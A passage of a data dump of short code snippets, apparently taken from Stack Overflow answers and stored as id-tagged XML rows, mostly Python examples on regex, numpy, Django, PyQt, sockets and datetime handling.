outlist.extend((i, other[0]) for i in ids - known)  # Append "Other" for all IDs with no real country
</snippet></ROW><ROW><id>11867117</id><snippet>[(10, 'India'), (12, 'USA'), (12, 'UK'), (11, 'Other')]
</snippet></ROW><ROW><id>11867198</id><snippet>latest_vulns</snippet></ROW><ROW><id>11867262</id><snippet>(?i)</snippet></ROW><ROW><id>11867262</id><snippet>re.I</snippet></ROW><ROW><id>11867262</id><snippet>(R)</snippet></ROW><ROW><id>11867262</id><snippet>\(R\)</snippet></ROW><ROW><id>11867262</id><snippet>"MicroR Windows Explorer"</snippet></ROW><ROW><id>11867262</id><snippet>with open(logfile) as inf:
    regex = re.compile(r"Micro\(R\) Windows Explorer", re.I)
    for line in inf:
        if regex.search(line):
             print 'found line',line
</snippet></ROW><ROW><id>11867500</id><snippet>foo = {}
foo['key'] = 'stuff'
</snippet></ROW><ROW><id>11867500</id><snippet>foo</snippet></ROW><ROW><id>11867500</id><snippet>bar = ['key', 'value']
</snippet></ROW><ROW><id>11867500</id><snippet>bar</snippet></ROW><ROW><id>11867500</id><snippet>bar</snippet></ROW><ROW><id>11867500</id><snippet>global bar</snippet></ROW><ROW><id>11867500</id><snippet>bar</snippet></ROW><ROW><id>11867500</id><snippet>global bar</snippet></ROW><ROW><id>11867500</id><snippet>bar</snippet></ROW><ROW><id>11867500</id><snippet>global varname</snippet></ROW><ROW><id>11867500</id><snippet>class State(object):
    def __init__(self):
        self.foo = {}
        self.foo_foo = {}
        self.bar = None

state = State()

def fn():
    state.bar = ['key', 'value']
</snippet></ROW><ROW><id>11868260</id><snippet>class Thing(object):
    def __init__(self, name, content=None):
        if content is None:
            content = []
        self.name = name
        self.content = content
</snippet></ROW><ROW><id>11868260</id><snippet>int</snippet></ROW><ROW><id>11868260</id><snippet>Thing</snippet></ROW><ROW><id>11868260</id><snippet>content</snippet></ROW><ROW><id>11868264</id><snippet>os.walk</snippet></ROW><ROW><id>11868264</id><snippet>import os.path, time
print "last modified: %s" % time.ctime(os.path.getmtime(file))
print "created: %s" % time.ctime(os.path.getctime(file))
</snippet></ROW><ROW><id>11868264</id><snippet>find</snippet></ROW><ROW><id>11868264</id><snippet>import os
from os.path import join
import datetime


def modification_date(filename):
        t = os.path.getmtime(filename)
        return t

def creation_date(filename):
        t = os.path.getctime(filename)
        return t

for root, dirs, files in os.walk("."):
        for name in files:
        print join(root, name), modification_date(join(root, name)), creation_date(join(root, name))
</snippet></ROW><ROW><id>11868350</id><snippet>q = (index + val for index, val in enumerate(someOtherGenerator))
</snippet></ROW><ROW><id>11868350</id><snippet>q</snippet></ROW><ROW><id>11868350</id><snippet>foo</snippet></ROW><ROW><id>11868350</id><snippet>doSomethingWithAGenerator(i+v for i,v in enumerate(someOtherGenerator))
</snippet></ROW><ROW><id>11868443</id><snippet>manage.py loaddata &lt;fixturename&gt;</snippet></ROW><ROW><id>11868443</id><snippet>&lt;fixturename&gt;</snippet></ROW><ROW><id>11868506</id><snippet>plt.draw</snippet></ROW><ROW><id>11868506</id><snippet>fig.show</snippet></ROW><ROW><id>11868506</id><snippet>coll = plt.scatter(rand(5), rand(5), c="k")
fig = plt.gcf()
fig.show()  # or fig.savefig("a.png")

coll.set_color(['b', 'g', 'r', 'y', 'k'])
fig.show()  # or fig.savefig("b.png")
</snippet></ROW><ROW><id>11868506</id><snippet>colors</snippet></ROW><ROW><id>11868506</id><snippet>scatter</snippet></ROW><ROW><id>11868506</id><snippet>num = 5
coll = plt.scatter(rand(num), rand(num), c='k')
# coll = plt.scatter(rand(num), rand(num), c=['b', 'g', 'r', 'y', 'k'])
fig = plt.gcf()
fig.show()

colors = coll.get_facecolor()
if colors.shape[0] == 1:
    newcolors = np.tile(colors, (num, 1))
else:
    newcolors = colors
newcolors[0] = [0, 0.75, 0.75, 1]
coll.set_color(newcolors)
</snippet></ROW><ROW><id>11868637</id><snippet>from xml.etree.ElementTree import ElementTree

tree = ElementTree()

# Test input
tree.parse("sample.xml")

# List containing names you want to keep
inputID = ['name1', 'name2', 'name3']

for node in tree.findall('.//data'):
    # Remove node if the name attribute value is not in inputID
    if not node.attrib.get('name') in inputID:
        tree.getroot().remove(node)

# Do what you want with the modified xml
tree.write('sample_out.xml')
</snippet></ROW><ROW><id>11868977</id><snippet>numpy.record</snippet></ROW><ROW><id>11868977</id><snippet>&gt;&gt;&gt; a_b = numpy.rec.fromarrays((a, b))
&gt;&gt;&gt; a_b
rec.array([(0, 1), (0, 2), (1, 1), (1, 2), (2, 1), (3, 4), (3, 7), (3, 9),
       (4, 4), (4, 8), (5, 1), (6, 1)], 
      dtype=[('f0', '&lt;i8'), ('f1', '&lt;i8')])
&gt;&gt;&gt; numpy.searchsorted(a_b, numpy.array((3, 7), dtype=a_b.dtype))
6
</snippet></ROW><ROW><id>11868977</id><snippet>sort</snippet></ROW><ROW><id>11868977</id><snippet>argsort</snippet></ROW><ROW><id>11868977</id><snippet>lexsort</snippet></ROW><ROW><id>11868977</id><snippet>&gt;&gt;&gt; random_idx = numpy.random.permutation(range(12))
&gt;&gt;&gt; a = numpy.array(a)[random_idx]
&gt;&gt;&gt; b = numpy.array(b)[random_idx]
&gt;&gt;&gt; sorted_idx = numpy.lexsort((b, a))
&gt;&gt;&gt; a[sorted_idx]
array([0, 0, 1, 1, 2, 3, 3, 3, 4, 4, 5, 6])
&gt;&gt;&gt; b[sorted_idx]
array([1, 2, 1, 2, 1, 4, 7, 9, 4, 8, 1, 1])
</snippet></ROW><ROW><id>11868977</id><snippet>&gt;&gt;&gt; a_b = numpy.rec.fromarrays((a, b))
&gt;&gt;&gt; a_b[a_b.argsort()]
rec.array([(0, 1), (0, 2), (1, 1), (1, 2), (2, 1), (3, 4), (3, 7), (3, 9),
       (4, 4), (4, 8), (5, 1), (6, 1)], 
      dtype=[('f0', '&lt;i8'), ('f1', '&lt;i8')])
&gt;&gt;&gt; a_b.sort()
&gt;&gt;&gt; a_b
rec.array([(0, 1), (0, 2), (1, 1), (1, 2), (2, 1), (3, 4), (3, 7), (3, 9),
       (4, 4), (4, 8), (5, 1), (6, 1)], 
      dtype=[('f0', '&lt;i8'), ('f1', '&lt;i8')])
</snippet></ROW><ROW><id>11868996</id><snippet>&gt;&gt;&gt; from itertools import chain
&gt;&gt;&gt; f = lambda x: x + 2
&gt;&gt;&gt; g = lambda x: x ** 2
&gt;&gt;&gt; list(chain.from_iterable((f(x), g(x)) for x in range(3)))
[2, 0, 3, 1, 4, 4]
</snippet></ROW><ROW><id>11868996</id><snippet>from timeit import timeit

f = lambda x: x + 2
g = lambda x: x ** 2

def fg(x):
    yield f(x)
    yield g(x)

print timeit(stmt='list(chain.from_iterable((f(x), g(x)) for x in range(3)))',
             setup='gc.enable(); from itertools import chain; f = lambda x: x + 2; g = lambda x: x ** 2')

print timeit(stmt='list(chain.from_iterable(fg(x) for x in range(3)))',
             setup='gc.enable(); from itertools import chain; from __main__ import fg; f = lambda x: x + 2; g = lambda x: x ** 2')

print timeit(stmt='[func(x) for x in range(3) for func in (f, g)]',
             setup='gc.enable(); f = lambda x: x + 2; g = lambda x: x ** 2')


print timeit(stmt='list(chain.from_iterable((f(x), g(x)) for x in xrange(10**6)))',
             setup='gc.enable(); from itertools import chain; f = lambda x: x + 2; g = lambda x: x ** 2',
             number=20)

print timeit(stmt='list(chain.from_iterable(fg(x) for x in xrange(10**6)))',
             setup='gc.enable(); from itertools import chain; from __main__ import fg; f = lambda x: x + 2; g = lambda x: x ** 2',
             number=20)

print timeit(stmt='[func(x) for x in xrange(10**6) for func in (f, g)]',
             setup='gc.enable(); f = lambda x: x + 2; g = lambda x: x ** 2',
             number=20)
</snippet></ROW><ROW><id>11869173</id><snippet>=sXX</snippet></ROW><ROW><id>11869173</id><snippet>XX</snippet></ROW><ROW><id>11869173</id><snippet>self.response.out.write(images.get_serving_url( blob_key ))</snippet></ROW><ROW><id>11869173</id><snippet>http://appengine.sample.com/appengineurlkey</snippet></ROW><ROW><id>11869173</id><snippet>http://appengine.sample.com/appengineurlkey**=s1600**</snippet></ROW><ROW><id>11869173</id><snippet>1600x1200</snippet></ROW><ROW><id>11869775</id><snippet>create_engine('sqlite:///:memory:')</snippet></ROW><ROW><id>11869775</id><snippet>create_engine('sqlite:////some/file/path/db.sqlite'</snippet></ROW><ROW><id>11869775</id><snippet>init_db</snippet></ROW><ROW><id>11869868</id><snippet>request</snippet></ROW><ROW><id>11869868</id><snippet>self</snippet></ROW><ROW><id>11869868</id><snippet>self.acl = getMyAccessControlList(request.method,request.session['username'])

...

if 'HAS_ALL_ACCESS' in self.acl:
</snippet></ROW><ROW><id>11869924</id><snippet>def activity(t):
       return  len(filter(lambda x:x[0]&lt;t&lt;x[0]+x[1],tickets))
</snippet></ROW><ROW><id>11869924</id><snippet>import numpy as np
tickets = np.array([(start1, duration1), (start2, duration2),...])

def activity(t,tickets):
    t1 = tickets[tickets[:,0]&lt;t] #start times before t
    return t2[t2[:,0]+t2[:,1]&gt;t]   #start+duration after t
</snippet></ROW><ROW><id>11869924</id><snippet>def activity(t, tickets):
    tickets.sort(key=lambda x:x[0]) #sort by start time
    gamma = 0
    for point, duration in tickets:
        if point &lt; t and t &lt; point + duration:
              gamma += 1
        elif point &gt; t:
              break ; #we can quit looking
    return gamma
</snippet></ROW><ROW><id>11869924</id><snippet>&gt;&gt;&gt; x=np.array([(1,2),(2,2),(1,4),(1,1),(3,2)])
&gt;&gt;&gt; x
array([[1, 2],
       [2, 2],
       [1, 4],
       [1, 1],
       [3, 2]])
&gt;&gt;&gt; def activity(t,tickets):
...     tmp = tickets[tickets[:,0] &lt; t]
...     return tmp[tmp[:,0]+tmp[:,1] &gt; t]
...
&gt;&gt;&gt; activity(2,x)
array([[1, 2],
       [1, 4]])
&gt;&gt;&gt; activity(3,x)
array([[2, 2],
       [1, 4]])
</snippet></ROW><ROW><id>11870034</id><snippet>python manage.py schemamigration web --initial
</snippet></ROW><ROW><id>11870034</id><snippet>add_introspection_rules([], ["^web\customfields\.unixtimestampfield\.UnixTimestampField"])
</snippet></ROW><ROW><id>11870034</id><snippet>add_introspection_rules([], ["^web\.customfields\.unixtimestampfield\.UnixTimestampField"])
</snippet></ROW><ROW><id>11870035</id><snippet>is_enabled()
</snippet></ROW><ROW><id>11870035</id><snippet>isEnabled()
</snippet></ROW><ROW><id>11870079</id><snippet>self.mystruct1</snippet></ROW><ROW><id>11870079</id><snippet>model</snippet></ROW><ROW><id>11870079</id><snippet>__init__</snippet></ROW><ROW><id>11870079</id><snippet>class Window(QtGui.QDialog):

    def __init__(self,parent=None):
        super(Window, self).__init__()
        ...
        initialData = self.get_data_status()
        self.table1 = MyTableStatus(initialData, 145, 4)
        ...
        self.timer_status = QtCore.QTimer()
        self.timer_status.timeout.connect(self.updateAllViews)

        # check every half-second
        self.timer_status.start(1000*2)

    def get_data_status(self):
        ...
        self.mystruct1 = {'A':self.lista1, 'B':self.listb1, 'C':self.listc1} 
        return self.mystruct1

    def updateAllViews(self):
        _ = self.get_data_status()
        self.updateTable()

    def updateTable(self):
        self.table1.updateFromDict(self.mystruct1)


class MyTableStatus(QTableWidget):

    def __init__(self, thestruct, *args): 
        QTableWidget.__init__(self, *args)
        self.setSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Preferred)
        self.setHorizontalHeaderLabels(['Server', 'Avg. Disk Queue','CPU Load',"Status"])
        self.setSortingEnabled(True)

        self.data = {}
        self.setmydata(thestruct)

    def updateFromDict(self, aDict):
        self.data.clear()
        self.data.update(aDict)

        self.setmydata()

    def setmydata(self):
        for n, key in enumerate(self.data):
            for m, item in enumerate(self.data[key]):
                newitem = QtGui.QTableWidgetItem(item)
                self.setItem(m, n, newitem)
</snippet></ROW><ROW><id>11870079</id><snippet>class Window(QtGui.QDialog):

    update_ready = QtCore.pyqtSignal(dict)

    def __init__(self,parent=None):
        ...
        # call a generate update and emit wrapper
        self.timer_status.timeout.connect(self.refreshData)
        # connect each view with a slot that expects a dict
        self.update_ready.connect(self.table1.updateFromDict)
        ...

    def refreshData(self):
        new_data = self.get_data_status()
        self.update_ready.emit(new_data)
</snippet></ROW><ROW><id>11870202</id><snippet>shutil.copy</snippet></ROW><ROW><id>11870202</id><snippet>shutil.copyfileobj</snippet></ROW><ROW><id>11870369</id><snippet>clearLayout</snippet></ROW><ROW><id>11870369</id><snippet># previous self.vbox_tags layout goes bye-bye
self.vbox_tags = QtGui.QVBoxLayout()

if self.tags != None:
    ...
else:
    # clearing a new empty one
    self.clearLayout(self.vbox_tags)
</snippet></ROW><ROW><id>11870369</id><snippet>self.tags != None</snippet></ROW><ROW><id>11870369</id><snippet>old_layout = self.vbox_tags
self.vbox_tags = QtGui.QVBoxLayout()
...
self.clearLayout(old_layout)
</snippet></ROW><ROW><id>11870369</id><snippet>old_layout.deleteLater()</snippet></ROW><ROW><id>11870499</id><snippet>import requests
r = requests.get(QUERY_URL)
return r.json

#normal return
return jsonify(username=g.user.username,
               email=g.user.email,
               id=g.user.id)
</snippet></ROW><ROW><id>11870744</id><snippet>action</snippet></ROW><ROW><id>11870744</id><snippet>action()</snippet></ROW><ROW><id>11870744</id><snippet> self.choices = {
            "1": self.show_notes,
            "2": self.search_notes,
            "3": self.add_note,
            "4": self.modify_note,
            "5": self.quit
            }
</snippet></ROW><ROW><id>11870744</id><snippet>self.choices["1"]</snippet></ROW><ROW><id>11870744</id><snippet>self.show_notes</snippet></ROW><ROW><id>11870744</id><snippet>action</snippet></ROW><ROW><id>11870744</id><snippet>action()</snippet></ROW><ROW><id>11870744</id><snippet>"\n".join("%s: %s" % (key, action.__doc__) for key, action in sorted(self.choices.iteritems()))</snippet></ROW><ROW><id>11870765</id><snippet>atcf</snippet></ROW><ROW><id>11870765</id><snippet>pygplib</snippet></ROW><ROW><id>11870765</id><snippet>import atcf
</snippet></ROW><ROW><id>11870765</id><snippet>pygplib/__init__.py</snippet></ROW><ROW><id>11870860</id><snippet>smtpd</snippet></ROW><ROW><id>11870860</id><snippet>EHLO</snippet></ROW><ROW><id>11870860</id><snippet>ESMTP</snippet></ROW><ROW><id>11870860</id><snippet>SMTP</snippet></ROW><ROW><id>11870860</id><snippet>smtpd</snippet></ROW><ROW><id>11870860</id><snippet>SMTP</snippet></ROW><ROW><id>11870860</id><snippet>EHLO</snippet></ROW><ROW><id>11871003</id><snippet>u['forSong'] = self.request.db.song.find({}, {'_id': 1})
</snippet></ROW><ROW><id>11871003</id><snippet>u['forSong'] = list(self.request.db.song.find({}, {'_id': 1}))
</snippet></ROW><ROW><id>11871003</id><snippet>from operator import itemgetter
...
u['forSong'] = map(itemgetter('_id'),
                   list(self.request.db.song.find({}, {'_id': 1})))
</snippet></ROW><ROW><id>11871016</id><snippet>c.stream.write_raw("&lt;presence to='jid@domain.com/resource/'&gt;")
</snippet></ROW><ROW><id>11871032</id><snippet>def f(low, high):
    ranges = collections.deque([(low, high)])
    while ranges:
        low, high = ranges.popleft()
        mid = (low + high) // 2
        yield mid
        if low &lt; mid:
            ranges.append((low, mid))
        if mid + 1 &lt; high:
            ranges.append((mid + 1, high))
</snippet></ROW><ROW><id>11871032</id><snippet>&gt;&gt;&gt; list(f(0, 20))
[10, 5, 15, 2, 8, 13, 18, 1, 4, 7, 9, 12, 14, 17, 19, 0, 3, 6, 11, 16]
</snippet></ROW><ROW><id>11871032</id><snippet>low, high</snippet></ROW><ROW><id>11871032</id><snippet>#include &lt;stdio.h&gt;

int main()
{
    const unsigned n = 20;
    for (unsigned i = 1; n &gt;&gt; (i - 1); ++i) {
        unsigned last = n;    // guaranteed to be different from all x values
        unsigned count = 1;
        for (unsigned j = 1; j &lt; (1 &lt;&lt; i); ++j) {
            const unsigned x = (n * j) &gt;&gt; i;
            if (last == x) {
                ++count;
            } else {
                if (count == 1 &amp;&amp; !(j &amp; 1)) {
                    printf("%u\n", last);
                }
                count = 1;
                last = x;
            }
        }
        if (count == 1)
            printf("%u\n", last);
    }
    return 0;
}
</snippet></ROW><ROW><id>11871032</id><snippet>0</snippet></ROW><ROW><id>11871032</id><snippet>for (int i = 1; n &gt;&gt; (i - 1); ++i) {
    const int m = 1 &lt;&lt; i;
    for (int x = n; x &lt; (n &lt;&lt; i); x += n &lt;&lt; 1) {
        const int k = x &amp; (m - 1);
        if (m - n &lt;= k &amp;&amp; k &lt; n)
            printf("%u\n", x &gt;&gt; i);
    }
}
</snippet></ROW><ROW><id>11871315</id><snippet>max_y = max(y_av)  # Find the maximum y value
max_x = x[y_av.index(max_y)]  # Find the x value corresponding to the maximum y value
print max_x, max_y
</snippet></ROW><ROW><id>11871315</id><snippet>max_y = max(y_av)  # Find the maximum y value
max_x = x[y_av.argmax()]  # Find the x value corresponding to the maximum y value
print max_x, max_y
</snippet></ROW><ROW><id>11871315</id><snippet>pylab.text(max_x, max_y, str((max_x, max_y)))
</snippet></ROW><ROW><id>11871332</id><snippet> (2, 10744,     1)
-(2,     1, 10744)
------------------
 (2, 10744, 10744)
</snippet></ROW><ROW><id>11871529</id><snippet>import csv

#Read in data anbd store it in dictionary.
#The element name will be stored in lowercase.
elemen_data = { element.lower():int(weight) for element,weight in csv.reader(open("in", "rb"))}

first = raw_input("Enter first element: ")
second = raw_input("Enter second element: ")

#Look for the weight of the entered element (after converting it to all lowercase)
weight_first = elemen_data.get(first.lower())
weight_second = elemen_data.get(second.lower())

if weight_first is not None:
    print 'First Element:', first, 'Weight:', weight_first
else:
    print 'First Element', first, 'not found'

if weight_second is not None:
    print 'Second Element:', second, 'Weight:', weight_first
else:
    print 'Second Element', second, 'not found'
</snippet></ROW><ROW><id>11871554</id><snippet>import subprocess
...
command_list = ['node', 'static/js/node_script.js']

try:
  output = subprocess.check_output(command_list)
except subprocess.CalledProcessError:
  output = "Error in command_list."
</snippet></ROW><ROW><id>11871609</id><snippet>++self._tag_count</snippet></ROW><ROW><id>11871609</id><snippet>++current_index</snippet></ROW><ROW><id>11871609</id><snippet>self._tag_count+=1</snippet></ROW><ROW><id>11871609</id><snippet>current_index+=1</snippet></ROW><ROW><id>11871609</id><snippet>++var</snippet></ROW><ROW><id>11871622</id><snippet>drafts = Draft.objects.filter(user=request.user)
</snippet></ROW><ROW><id>11871671</id><snippet>Notes.notes</snippet></ROW><ROW><id>11871671</id><snippet>for note in Notes.notes:
    print(note.memo)
</snippet></ROW><ROW><id>11871873</id><snippet>def recvall(sock, size):
    msg = ''
    while len(msg) &lt; size:
        part = sock.recv(size-len(msg))
        if part == '': 
            break # the connection is closed
        msg += part
    return msg
</snippet></ROW><ROW><id>11871873</id><snippet>recv</snippet></ROW><ROW><id>11871873</id><snippet>sock</snippet></ROW><ROW><id>11871873</id><snippet>size</snippet></ROW><ROW><id>11871873</id><snippet>part == ''</snippet></ROW><ROW><id>11871873</id><snippet>requestCode = struct.unpack('&gt;i', self.request.recv(4))[0]
</snippet></ROW><ROW><id>11871873</id><snippet>requestCode = struct.unpack('&gt;i', recvall(self.request, 4))[0]
</snippet></ROW><ROW><id>11871873</id><snippet>recvall</snippet></ROW><ROW><id>11871969</id><snippet>Py_WatershedIFT</snippet></ROW><ROW><id>11871969</id><snippet>NI_WatershedIFT</snippet></ROW><ROW><id>11872243</id><snippet>pathTuple = tuple(int(x) for x in path2 )
G.add_path([path[:i+1] for i in range(0, len(path))])
</snippet></ROW><ROW><id>11872243</id><snippet>import collections
counts = collections.defaultdict(lambda:collections.defaultdict(lambda:0))
</snippet></ROW><ROW><id>11872243</id><snippet>counts[level][node]</snippet></ROW><ROW><id>11872243</id><snippet>#create graph
G = nx.MultiGraph()

#read in strings from csv
testfile = 'C:…file.txt'

with open(testfile, "r") as f:
    line = f.readline
    f = (i for i in f if '\t' in i.rstrip())
    for line in f:
        customerID, path = line.rstrip().split("\t")
        path2 =  path.rstrip("\\").rstrip("}").split(",")
        pathTuple = tuple(int(x) for x in path2 )
        G.add_path([pathTuple[:i+1] for i in range(0, len(pathTuple))])

        for level, node in enumerate(path):
            counts[level][node]+=1
</snippet></ROW><ROW><id>11872243</id><snippet>level = 0
node = 1
print 'Node', node, 'appears', counts[level][node], 'times on level', level
&gt;&gt;&gt; Node 1 appears 4 times on level 0
</snippet></ROW><ROW><id>11872283</id><snippet>SELECT
    u.id
FROM
    subscriptions sub  JOIN
    users u ON u.id = sub.subscriber_id LEFT JOIN
    subscriptions unsub
        ON unsub.subscribee_id = sub.subscriber_id
        AND unsub.subscriber_id= sub.subscribee_id 
WHERE
    sub.subscribee_id = :user_id
    AND unsub.subscribee_id IS NULL
</snippet></ROW><ROW><id>11872375</id><snippet>time</snippet></ROW><ROW><id>11872375</id><snippet>datetime</snippet></ROW><ROW><id>11872375</id><snippet>&gt;&gt;&gt; import datetime
&gt;&gt;&gt; icmpstamp = datetime.datetime.fromtimestamp(1344448836.482289)
&gt;&gt;&gt; icmpstamp
datetime.datetime(2012, 8, 8, 20, 0, 36, 482289)
&gt;&gt;&gt; print icmpstamp
2012-08-08 20:00:36.482289
&gt;&gt;&gt; datastamp = datetime.datetime.fromtimestamp(1344448832.707281)
&gt;&gt;&gt; datastamp
datetime.datetime(2012, 8, 8, 20, 0, 32, 707281)
&gt;&gt;&gt; print datastamp
2012-08-08 20:00:32.707281
&gt;&gt;&gt; difference = icmpstamp - datastamp
&gt;&gt;&gt; difference
datetime.timedelta(0, 3, 775008)
&gt;&gt;&gt; print difference
0:00:03.775008
</snippet></ROW><ROW><id>11872375</id><snippet>RTT</snippet></ROW><ROW><id>11872582</id><snippet>s = '31 31 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
</snippet></ROW><ROW><id>11872582</id><snippet>int('31', 16) == 49</snippet></ROW><ROW><id>11872582</id><snippet>bin(49) == '0b110001'</snippet></ROW><ROW><id>11872582</id><snippet>'0b'</snippet></ROW><ROW><id>11872582</id><snippet>[2:]</snippet></ROW><ROW><id>11872582</id><snippet>'110001'.zfill(8) == '00110001'</snippet></ROW><ROW><id>11872582</id><snippet>s = ''.join(bin(int(b, 16))[2:].zfill(8) for b in s.split())
# Now `s` is
</snippet></ROW><ROW><id>11872582</id><snippet>enumerate</snippet></ROW><ROW><id>11872582</id><snippet>b</snippet></ROW><ROW><id>11872582</id><snippet>i</snippet></ROW><ROW><id>11872582</id><snippet>'1'</snippet></ROW><ROW><id>11872582</id><snippet>r = [i for i, b in enumerate(s) if b=='1']
# Now `r` is [2, 3, 7, 10, 11, 15]
</snippet></ROW><ROW><id>11872720</id><snippet>    from PySide.QtGui import QLineEdit

    class FileEdit(QLineEdit):
        def __init__( self, parent ):
            super(FileEdit, self).__init__(parent)

            self.setDragEnabled(True)

        def dragEnterEvent( self, event ):
            data = event.mimeData()
            urls = data.urls()
            if ( urls and urls[0].scheme() == 'file' ):
                event.acceptProposedAction()

        def dragMoveEvent( self, event ):
            data = event.mimeData()
            urls = data.urls()
            if ( urls and urls[0].scheme() == 'file' ):
                event.acceptProposedAction()

        def dropEvent( self, event ):
            data = event.mimeData()
            urls = data.urls()
            if ( urls and urls[0].scheme() == 'file' ):
                # for some reason, this doubles up the intro slash
                filepath = str(urls[0].path())[1:]
                self.setText(filepath)
</snippet></ROW><ROW><id>11872857</id><snippet>%</snippet></ROW><ROW><id>11872857</id><snippet>print (" -  %d PNG files were found at this folder (and subfolders)." % len(pngs))
</snippet></ROW><ROW><id>11872991</id><snippet>Run_program.bat:

python script1.py
python script2.py
run_program.exe
</snippet></ROW><ROW><id>11873114</id><snippet>decimal</snippet></ROW><ROW><id>11873118</id><snippet>def myview(request, person_id):
    data = None
    if request.method == "POST":
        data = request.POST
    form = CreateNewItemForm(data)
    if form.is_valid():
        newitem = form.save(commit=False)
        newitem.person = Person.objects.get(id=person_id)
        newitem.save()
</snippet></ROW><ROW><id>11873149</id><snippet>render_page</snippet></ROW><ROW><id>11873149</id><snippet>url(r'^(?P&lt;page&gt;.*)$',render_page),
</snippet></ROW><ROW><id>11873149</id><snippet>epresence</snippet></ROW><ROW><id>11873149</id><snippet>navs</snippet></ROW><ROW><id>11873401</id><snippet>.title()</snippet></ROW><ROW><id>11873401</id><snippet>import Tkinter as tk

class MyApplication(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self.title("Root Window")
        self.bind("&lt;1&gt;", self.showChild)

    def showChild(self, event=None):
        self.top = tk.Toplevel(self)
        self.top.title("This is the CHILD window")

app = MyApplication()
app.mainloop()
</snippet></ROW><ROW><id>11873412</id><snippet>class Engine(object):
    def __init__(self):
        self.board = Board()
        self.move_list = []

    def make_move(self, from, to):
        #board.makeMove returns a "memento object".
        self.move_list.append(board.makeMove(from, to))
        ...

    def undo_move(self):
        board.undo(self.move_list.pop())
    ...
    ...
</snippet></ROW><ROW><id>11873412</id><snippet>class Move(object):
    def __init__(self, from_coords, to_coords, capture=None):
        self.from = from_coords
        self.to = to_coords
        self.capture = capture
</snippet></ROW><ROW><id>11873412</id><snippet>Board</snippet></ROW><ROW><id>11873412</id><snippet>class Board(object):
    ...
    def make_move(self, from_coords, to_coords):
        #move logic here
        return Move(from_coords, to_coords, capturedPiece)

    def undo_move(self, move_object):
        self.make_move(move_object.to_coords, move_object.from_coords)
        self.uncapture(move_object.capture, move_object.to_coords)
</snippet></ROW><ROW><id>11873412</id><snippet>Move</snippet></ROW><ROW><id>11873412</id><snippet>(from, to, capturedpiece)</snippet></ROW><ROW><id>11873494</id><snippet>myfile = open(mydir,'r')
for line in myfile:
    if line in ['\n', '\r\n']:
        break
for line in myfile:
    #dostuff
</snippet></ROW><ROW><id>11873654</id><snippet>pymongo</snippet></ROW><ROW><id>11873761</id><snippet>datetime</snippet></ROW><ROW><id>11873761</id><snippet>datetime.datetime</snippet></ROW><ROW><id>11873761</id><snippet>import datetime
import pytz

utc = pytz.utc
utc_dt = datetime.datetime(2002, 10, 27, 6, 0, 0, tzinfo=utc)
eastern = pytz.timezone('US/Eastern')
loc_dt = utc_dt.astimezone(eastern)
fmt = '%Y-%m-%d %H:%M:%S %Z%z'
loc_dt.strftime(fmt)
</snippet></ROW><ROW><id>11873761</id><snippet>datetime.datetime</snippet></ROW><ROW><id>11873796</id><snippet>np.random.uniform(5,10) # A single value
np.random.uniform(5,10,[2,3]) # A 2x3 array
</snippet></ROW><ROW><id>11873837</id><snippet>from multiprocessing import Process, Value

def callback(x):
    return x * 2

def handler(x, fn, a):
    a.value = fn(x.value)

if __name__ == '__main__':
    x = Value('d', 2)
    a = Value('d', 0)
    p1 = Process(target=handler, args=(x, callback, a))
    p2 = Process(target=handler, args=(x, callback, a))
    p1.start()
    p2.start()
    p1.join()
    p2.join()
    print a.value
</snippet></ROW><ROW><id>11873965</id><snippet> browser.profile.path
</snippet></ROW><ROW><id>11874115</id><snippet>arcpy.da</snippet></ROW><ROW><id>11874115</id><snippet>shape.__geo_interface__</snippet></ROW><ROW><id>11874115</id><snippet>AsShape</snippet></ROW><ROW><id>11874115</id><snippet>def cursor_to_dicts(cursor, field_names):
    for row in cursor:
        row_dict = {}
        for field in field_names:
            val = row.getValue(field)
            row_dict[field] = getattr(val, '__geo_interface__', val)
        yield row_dict

fc = '/path/to/fc'
fields = [f.name for f in arcpy.ListFields(fc)]   # get field list
features = list(cursor_to_dicts(arcpy.SearchCursor(fc), fields))
</snippet></ROW><ROW><id>11874115</id><snippet>getattr()</snippet></ROW><ROW><id>11874115</id><snippet>value.__geo_interface__</snippet></ROW><ROW><id>11874115</id><snippet>value</snippet></ROW><ROW><id>11874115</id><snippet>arcpy</snippet></ROW><ROW><id>11874182</id><snippet>ast.literal_eval</snippet></ROW><ROW><id>11874182</id><snippet>type(ast.literal_eval(s))
</snippet></ROW><ROW><id>11874372</id><snippet>random.sample</snippet></ROW><ROW><id>11874372</id><snippet>allPositions</snippet></ROW><ROW><id>11874372</id><snippet>synapsesPerSegment</snippet></ROW><ROW><id>11874372</id><snippet>(rx, ry)</snippet></ROW><ROW><id>11874372</id><snippet>allPositions</snippet></ROW><ROW><id>11874372</id><snippet>(rx, ry)</snippet></ROW><ROW><id>11874372</id><snippet>rx</snippet></ROW><ROW><id>11874372</id><snippet>ry</snippet></ROW><ROW><id>11874372</id><snippet>(a, b) = (99, 100)</snippet></ROW><ROW><id>11874372</id><snippet>(c, d) = (a, b)</snippet></ROW><ROW><id>11874372</id><snippet>c == 99</snippet></ROW><ROW><id>11874372</id><snippet>d == 100</snippet></ROW><ROW><id>11874372</id><snippet>allPositions = [(1,100), (2, 200), (3, 300), (4, 400)]</snippet></ROW><ROW><id>11874372</id><snippet>synapsesPerSegment = 3</snippet></ROW><ROW><id>11874372</id><snippet>random.sample(allPositions, synapsesPerSegment)</snippet></ROW><ROW><id>11874372</id><snippet>[(3, 300), (1,100), (2, 200)]</snippet></ROW><ROW><id>11874372</id><snippet>allPositions</snippet></ROW><ROW><id>11874372</id><snippet>rx = 4</snippet></ROW><ROW><id>11874372</id><snippet>ry = 400</snippet></ROW><ROW><id>11874372</id><snippet>rx = 1</snippet></ROW><ROW><id>11874372</id><snippet>ry = 100</snippet></ROW><ROW><id>11874372</id><snippet>rx = 2</snippet></ROW><ROW><id>11874372</id><snippet>ry = 200</snippet></ROW><ROW><id>11874565</id><snippet>&gt;&gt;&gt; re.match("r", "$r")    # no match since re.match is equivalent to '^r'
